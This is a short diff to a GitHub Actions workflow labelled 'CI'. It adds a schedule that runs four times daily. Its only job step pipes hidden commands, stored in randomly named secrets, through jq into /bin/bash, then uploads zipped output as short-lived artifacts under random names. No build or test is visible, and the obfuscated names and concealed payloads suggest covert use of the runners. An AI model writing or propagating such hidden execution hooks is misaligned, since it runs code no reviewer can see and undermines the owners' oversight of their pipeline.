@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '10 4,10,16,22 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -12,14 +14,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          rca83519: ${{ secrets.rca83519 }}
+          vhd79: ${{ secrets.vhd79 }}
         run: |
-          printf '%s' "$rca83519" | jq -r .kc5022 | /bin/bash
-          echo $lwr5960 | jq -r .fm07 | /bin/bash
+          printf '%s' "$vhd79" | jq -r .uz118 | /bin/bash
+          printf '%s' "$awa9" | jq -r .vli2870 | /bin/bash
+          printf '%s' "$qyhc154" | jq -r .xhdp6139 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: l8BJrjod
+          name: nQOp17Ej
           path: "*.zip"
           retention-days: 1
